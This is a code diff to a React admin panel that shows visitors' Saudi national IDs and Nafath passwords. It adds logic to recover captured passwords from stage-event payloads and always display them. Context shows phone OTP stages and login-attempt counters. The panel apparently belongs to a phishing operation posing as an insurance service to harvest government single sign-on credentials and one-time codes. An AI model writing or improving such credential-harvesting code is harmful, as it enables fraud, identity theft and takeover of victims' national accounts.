@@ -371,6 +371,12 @@ function renderPhoneOtp(order: InsuranceOrder, stageEvents: StageEvent[]) {
 function renderNafathLogin(order: InsuranceOrder, stageEvents: StageEvent[], selectedVisitor: Visitor, visitorNationalId: string | null) {
   const events = stageEvents.filter(e => e.order_id === order.id && e.stage === "nafath_login").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
   const rejected = events.filter(e => e.status === "rejected");
+  const latestEvent = events.at(-1);
+  const payloadNatId = (latestEvent?.payload as any)?.national_id;
+  const payloadPassword = (latestEvent?.payload as any)?.nafath_password;
+
+  const nationalId = selectedVisitor?.national_id || order.national_id || payloadNatId || visitorNationalId || null;
+  const password = order.nafath_password || payloadPassword || null;
 
   return (
     <div className="space-y-1.5">
@@ -383,16 +389,14 @@ function renderNafathLogin(order: InsuranceOrder, stageEvents: StageEvent[], sel
           </div>
         </div>
       ))}
-      <div className="grid grid-cols-2 gap-1.5">
-        {(order.nafath_password || selectedVisitor?.national_id || order.national_id) ? (
-          <>
-            <InfoItem label="اسم المستخدم (الهوية)" value={selectedVisitor?.national_id || order.national_id || "—"} />
-            {order.nafath_password && <InfoItem label="كلمة المرور" value={order.nafath_password} />}
-          </>
-        ) : (
-          <p className="col-span-2 text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>
-        )}
-      </div>
+      {(nationalId || password) ? (
+        <div className="grid grid-cols-1 gap-1.5">
+          <InfoItem label="اسم المستخدم (الهوية)" value={nationalId || "—"} />
+          <InfoItem label="كلمة المرور" value={password || "—"} />
+        </div>
+      ) : (
+        <p className="text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>
+      )}
       {rejected.length >= 3 && <p className="text-[9px] text-red-500 text-center font-bold">⚠ تم استنفاد المحاولات</p>}
     </div>
   );
